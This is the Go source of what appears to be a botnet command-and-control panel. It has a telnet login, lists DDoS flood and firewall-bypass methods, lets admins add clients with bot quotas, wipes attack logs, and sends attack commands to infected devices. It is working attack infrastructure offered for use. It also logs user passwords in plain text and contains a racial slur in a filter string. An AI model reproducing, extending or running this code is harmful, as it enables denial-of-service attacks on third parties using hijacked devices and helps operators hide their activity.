package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
	"math/rand"
	"log"
	"os"
	"github.com/mattn/go-shellwords"
	"github.com/syrinsecurity/gologger"
)

/*--------------------------------------------------------------------------------------------------------------------------------------------*/

var (
	logger, _        = gologger.New("ServerLogger", 10, gologger.PanicIfFileError)
	sessionLogger, _ = gologger.New("SharingLogger", 10, gologger.PanicIfFileError)
)

/*--------------------------------------------------------------------------------------------------------------------------------------------*/

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	var attackStatus int = 0
    attackStatusPointer := &attackStatus
    //Terimnal
	// Get username
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))   
    this.conn.Write([]byte("\033[31;01m\r\n"))                                                                                                                                                                                                                                          
    this.conn.Write([]byte("\033[38;5;160mUsername \033[31;01m> \x1b[31;01m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\033[38;5;160mPassword \033[31;01m> \x1b[31;01m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[38;5;160m\033[38;5;160mVerifying Credentials \033[31;01m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(300) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo

	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\033[2J\033[1;1H"))
		this.conn.Write([]byte("\033[38;5;160mInvalid Login | Press Any Key To Exit Terminal.\033[31;01m"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
    }
    /*--------------------------------------------------------------------------------------------------------------------------------------------*/

    if len(username) > 0 && len(password) > 0 {
        log.SetFlags(log.LstdFlags)
        loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
        if err != nil {
            fmt.Println("Error: ", err)
        }
        success := "Successful DB Login"
        usernameFormat := "Username:"
        passwordFormat := "Password:"
        ipFormat := "IP:"
        cmdSplit := "|"  
        log.SetOutput(loginLogsOutput)
        log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
    }

    /*--------------------------------------------------------------------------------------------------------------------------------------------*/

	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d | Running: %d | Clients: %d\007", BotCount, database.fetchRunningAttacks(), database.fetchUsers()))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	var session = &session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     this.conn,
	}

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

/*--------------------------------------------------------------------------------------------------------------------------------------------*/


        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\x1b[38;5;160m             Добро пожаловать в терминал.\r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                        .--. \r\n")) 
        this.conn.Write([]byte("\x1b[38;5;160m                       |o_o | \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                       |:_/ | \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                      //   \\ \\ \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                     (|     | ) \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                    /'\\ _  _/`\\ \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                    \\___)=(___/ \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                     \r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        
 /*--------------------------------------------------------------------------------------------------------------------------------------------*/
	for {
		var botCatagory string
		var botCount int
        this.conn.Write([]byte("\x1b[38;5;160m[" + username + "\x1b[31;01m@\x1b[38;5;160mbotnet\x1b[31;01m]\033[0m "))
		cmd, err := this.ReadLine(false)
		args, _ := shellwords.Parse(cmd)

		if err != nil || cmd == "exit" || cmd == "quit" || cmd == "logout" {
			return
		}
		if cmd == "" {
			continue
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		}

		if strings.Contains(cmd, "@") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mCrash Attempt Logged " + username + "\033[0m\r\n"))
			continue
		}

		if strings.HasPrefix(cmd, "-") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mCrash Attempt Logged " + username + "\033[0m\r\n"))
			continue
		}

		if strings.HasSuffix(cmd, "=") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mInvalid Flag! " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "nigger") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mHey " + username + " You're Dad Doesn't Exist\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ",") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mOne Attack At A Time! " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "1.1.1.1") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mThis Host Is Blacklisted! " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "8.8.8.8") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mThis Host Is Blacklisted! " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".ca") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mNo Hitting Gov " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".us") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mNo Hitting Gov " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".uk") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mNo Hitting Gov " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".au") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mNo Hitting Gov " + username + "\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "fbi") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mThis Host Is Blacklisted!\033[0m " + username + "\r\n"))
			continue
		}


		if strings.Contains(cmd, "pornhub") {
			this.conn.Write([]byte("\033[38;5;160m-\033[31mInteresting Take, I Love Milfs. " + username + "\033[0m\r\n"))
			continue
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		}

	    if cmd == "clear" || cmd == "cls" || cmd == "c" {
        this.conn.Write([]byte("\x1b[2J\x1b[1H"))
        this.conn.Write([]byte("\x1b\r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m Успешно заверенная проверка, добро пожаловать\r\n"))         
        this.conn.Write([]byte("\x1b[38;5;160m                        .--. \r\n")) 
        this.conn.Write([]byte("\x1b[38;5;160m                       |o_o | \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                       |:_/ | \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                      //   \\ \\ \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                     (|     | ) \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                    /'\\ _  _/`\\ \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                    \\___)=(___/ \r\n"))
        this.conn.Write([]byte("\x1b[38;5;160m                     \r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        continue

        /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		}

		if cmd == "help" || cmd == "HELP" { // display help menu
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160m?/methods/attack\x1b[31;01m: \033[0mView All Attack Options \r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mterminal/session\x1b[31;01m: \033[0mView's Admin/Client Sessions\033[0m \r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mdevices/bots\x1b[31;01m: \033[0mView All Devices/Archs\033[0m \r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mfloods enable/disable\x1b[31;01m: \033[0mDisables/Enables Attacks\033[0m \r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mexit/logout\x1b[31;01m: \033[0mQuit's Terminal Connection. Fixes Detection Issues.\033[0m \r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mclear/cls\x1b[31;01m: \033[0mClear/Wipe CNC Terminal.  \033[0m \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
	    /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		}

		if cmd == "attack" || cmd == "methods"  || cmd == "?" { // Display Attack Methods/Fixtures.
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mLayer 4 Syntax\x1b[31;01m:\x1b[31;01m vtcp <host> <time> <dport=port>\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mLayer 7 Syntax\x1b[31;01m:\x1b[31;01m http <host> <time> <domain=http://> <conns=>\x1b[0m\r\n"))
            this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mudpflood\x1b[31;01m: \x1b[0mudp flood maximizes pps and sends false data.\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mtcpflood\x1b[31;01m: \x1b[0mtcp flood with customized options and payload.\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mdnsflood\x1b[31;01m: \x1b[0mdns flood with customized options. \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mackflood\x1b[31;01m: \x1b[0mack flood with customized options and payload. \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mvseflood\x1b[31;01m: \x1b[0mvse flood with customized options.\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160moverflow\x1b[31;01m: \x1b[0mbuffer overflow exceed capacity of a network resource.\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mhttpflood\x1b[31;01m: \x1b[0mhttp flood with tls/ssl exhaustion SSL handshake.\x1b[0m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mBypass Methods\x1b[31;01m: \x1b[0mCustomized To Bypass Firewalls\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mtcpbypass\x1b[31;01m: \x1b[0mtcp state exhaustion flood sends encrypted data. \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mtcpreset\x1b[31;01m: \x1b[0mtcp reset segment kills connection using fake msgs. reset=1.\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mudpbypass\x1b[31;01m: \x1b[0mudp flood randomizes cudp data and sends rand bytes.\x1b[0m\r\n"))
            //this.conn.Write([]byte("\x1b[38;5;160micmpflood\x1b[31;01m: \x1b[0micmp flood overwhelms ip with echo and ping request.\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160movhbypass\x1b[31;01m: \x1b[0movh flood bypasses servers with set firewall/tables.\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mhandshake\x1b[31;01m: \x1b[0mhandshake exhaust destination syn queue on networks.\x1b[0m\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
		
        }

		if cmd == "flags" || cmd == "options"  || cmd == "opts" { // Display Attack Methods/Fixtures.
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160mL4 Flags | Options\x1b[31;01m:\x1b[31;01mlen, rand, ttl, sport, syn= ack= psh= any tcp flag etc.\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;160mL7 Flags | Options\x1b[31;01m:\x1b[31;01mconns, domain postdata, path=/, method=POST/GET, tls/ssl=.\x1b[0m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[38;5;160mLayer 4 UDP/TCP Flag Note: You Only Use Payload If You Have Payload Data You Want To Send NOOB.\033[37;1m.\r\n"))
            this.conn.Write([]byte("\033[38;5;160mLayer 4 TCP/FLG Flag Note: You Only Use TCPFLGS If You Want To Use A Specific TCP Flag To Send.\033[37;1m.\r\n"))
            this.conn.Write([]byte("\033[38;5;160mLayer 7 TSP/SSL Flag Note: You Only Use SSL/TSL If The Host Is Using a HTTPs Domain/ On Protection.\033[37;1m.\r\n"))
            this.conn.Write([]byte("\r\n"))
		}

        if attackStatus < 1 && userInfo.admin > 0 && cmd == "floods enable" {
            this.conn.Write([]byte("\033[38;5;160mFloods Have Already Been Enabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "floods disable" {
            this.conn.Write([]byte("\033[38;5;160mFloods Have Already Been Disabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus < 1 && userInfo.admin > 0 && cmd == "floods disable" {
            this.conn.Write([]byte("\033[38;5;160mFloods Successfully Disabled\033[37;1m.\r\n"))
            *attackStatusPointer = 1
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "floods enable" {
            this.conn.Write([]byte("\033[38;5;160mFloods Successfully Enabled\033[37;1m.\r\n"))
            *attackStatusPointer = 0
            continue
        }
        if attackStatus > 0 && strings.Contains(cmd, "udpflood") || attackStatus > 0 && strings.Contains(cmd, "tcpflood") || attackStatus > 0 && strings.Contains(cmd, "udpflood") || attackStatus > 0 && strings.Contains(cmd, "dnsflood") || attackStatus > 0 && strings.Contains(cmd, "vseflood") || attackStatus > 0 && strings.Contains(cmd, "httpflood") || attackStatus > 0 && strings.Contains(cmd, "tcpbypass") || attackStatus > 0 && strings.Contains(cmd, "udpbypass") || attackStatus > 0 && strings.Contains(cmd, "icmpflood") || attackStatus > 0 && strings.Contains(cmd, "ovhbypass") || attackStatus > 0 && strings.Contains(cmd, "handshake") || attackStatus > 0 && strings.Contains(cmd, "overflow"){
            this.conn.Write([]byte("\033[38;5;160mSelected Flood Has Been Disabled By An Admin\033[37;1m.\r\n"))
            continue
        }
		if userInfo.admin == 1 && cmd == "admin" {
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[31;01m \033[1;34madduser > \033[1;35mAdds Regular Clients  \033[31;01m\r\n"))
			this.conn.Write([]byte("\033[31;01m \033[1;34mremove  > \033[1;35mRemoves Clients        \033[31;01m\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if userInfo.admin == 1 && cmd == "terminal" || cmd == "sessions" {
			fmt.Fprintln(this.conn, "\033[38;5;160m║\033[31;01mTotal Attacks Sent: \033[31;01m"+fmt.Sprint(database.fetchAttacks())+"\033[0m\r")
			fmt.Fprintln(this.conn, "\033[38;5;160m║\033[31;01mTotal Attacks Running: \033[31;01m"+fmt.Sprint(database.fetchRunningAttacks())+"\033[0m\r")
			fmt.Fprintln(this.conn, "\033[38;5;160m║\033[31;01mTotal Clients: \033[31;01m"+fmt.Sprint(database.fetchUsers())+"\033[0m\r")
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;160m║\033[31;01mTotal Devices: %d\033[0m\r", botCount)))
			fmt.Fprintln(this.conn, "\033[38;5;160m║\033[31;01mOnline Clients:\033[31;01m"+fmt.Sprint(database.fetchUsers())+"\033[0m\r")
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;160m║\033[31;01mMost Recent Clients: %d\033[0m\r", len(username))))
			fmt.Fprintln(this.conn, "\033[38;5;160m║\033[31;01mTerminal Uplink/Uptime: \033[31;01m100.00%\033[0m\r")
			continue

	    /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		}
		if cmd == "credits" || cmd == "CREDITS" || cmd == "credit" || cmd == "CREDIT" {
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[31;01mAttack Methods Revamped By Carl, CNC Developed By Grace/@synfloods.\r\n"))
			this.conn.Write([]byte("\r\n"))
            continue
        }

		if err != nil || cmd == "users" || cmd == "clients" {
			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "\033[97mYou Do Not Have Permission To Use This Command.\r\n")
				continue
			}
			for _, s := range sessions {
				line := fmt.Sprintf("%d, %s, %s", s.ID, s.Username, s.Conn.RemoteAddr())
				fmt.Fprintf(this.conn, "\033[97m%s\r\n", (line))
			}
			continue

        /*--------------------------------------------------------------------------------------------------------------------------------------------*/
        }

        if len(cmd) > 0 {
            log.SetFlags(log.LstdFlags)
            output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
            if err != nil {
                fmt.Println("Error: ", err)
            }
            usernameFormat := "Username:"
            cmdFormat := "Command:"
            ipFormat := "IP:"
            cmdSplit := "|" 
            log.SetOutput(output)
            log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
        /*--------------------------------------------------------------------------------------------------------------------------------------------*/
        }

        if userInfo.admin == 1 && cmd == "clearlogs"  {
            this.conn.Write([]byte("\033[1;91mClear Attack Logs\033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, Failed To Clean DB Logs.\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack Logs Wiped Successfully.\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs Has Been Cleaned By \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        /*--------------------------------------------------------------------------------------------------------------------------------------------*/
        }

		if cmd == "bots" || cmd == "statistics" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s: \x1b[1;35m%d\033[0m\r\n\033[0m", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;160mTotal Devices: \033[38;5;160m[\033[31;01m%d\033[38;5;160m]\r\n\033[0m", botCount)))
			continue
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
		}
        if userInfo.admin == 1 && cmd == "remove" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if !database.TempBan(new_un) {
                this.conn.Write([]byte("User Doesn't Exist In Current Database\r\n"))
            } else {
                this.conn.Write([]byte("User Terminated Successfully.\r\n"))
            }
            continue
        }

		botCount = userInfo.maxBots
        /*--------------------------------------------------------------------------------------------------------------------------------------------*/
        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
            }
            continue

            /*--------------------------------------------------------------------------------------------------------------------------------------------*/
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mFailed To Add A New Client\033[37;1m,\033[95m Error Occured\033[37;1m.")))
			} else {
				this.conn.Write([]byte("\033[38;5;033mAdded Client To The Database\033[37;1m.\r\n"))
				fmt.Printf("Admin: (" + username + ") Succesfully Added A New Client (" + new_un + ") More Info At /root/logs/adminlogs.txt\r\n")
				log.SetFlags(log.LstdFlags)
				newClientOutput, err := os.OpenFile("logs/adminlogs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0670)
				if err != nil {
					fmt.Println("Error: ", err)
				}
				message := "Added A New Client,"
				adminFormat := "Admin:"
				usernameFormat := "Username:"
				cmdSplit := "-"
				newUserFormat := "New User Details:"
				passwordFormat := "Password:"
				durationFormat := "Duration:"
				botsFormat := "bots:"
				cooldownFormat := "Cooldown:"
				log.SetOutput(newClientOutput)
				log.Println(cmdSplit, adminFormat, username, message, newUserFormat, usernameFormat, new_un, cmdSplit, passwordFormat, new_pw, cmdSplit, botsFormat, max_bots_str, cmdSplit, durationFormat, duration_str, cmdSplit, cooldownFormat, cooldown_str)
			     }
                 continue
            /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		}
		if cmd[0] == '*' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '-' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var BotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        BotCount = userInfo.maxBots
                    } else {
                        BotCount = clientList.Count()
                    }
                    
                    this.conn.Write([]byte(fmt.Sprintf("\033[38;5;160mAttack Has Been Broadcasted To \033[38;5;160m%d Devices\r\n", BotCount)))
                    this.conn.Write([]byte(fmt.Sprintf("\033[38;5;160mAttack Requested An %s Flood To %s For %s Seconds\r\n", args[0], args[1], args[2])))
				    } else {
										//no whitelist.
					//his.conn.Write([]byte(f))
				}
			}
		}
		/* ═══════════════ ATTACK END ═══════════════ */
	}
}
func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1000)
	bufPos := 0
	for {
		if len(buf) < bufPos+2 { 
			fmt.Println("Buffer Overflow Attack Prevented IP Requested Attack:", this.conn.RemoteAddr())
			return string(buf), nil

        }
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
